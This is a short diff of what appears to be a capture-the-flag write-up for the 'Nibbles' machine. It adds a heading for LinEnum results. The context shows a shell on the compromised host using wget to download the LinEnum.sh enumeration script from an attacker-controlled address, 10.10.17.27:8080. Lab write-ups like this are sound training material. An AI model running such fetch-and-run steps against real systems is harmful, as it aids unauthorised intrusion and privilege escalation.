@@ -55,6 +55,7 @@ LinEnum.sh            100%[======================>]  45.54K  --.-KB/s    in 0.01
 
 
 ```
+# LIN EMUM RESULTS 
 ```
 nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.17.27:8080/LinEnum.sh
 <er/personal/stuff$ wget http://10.10.17.27:8080/LinEnum.sh                  
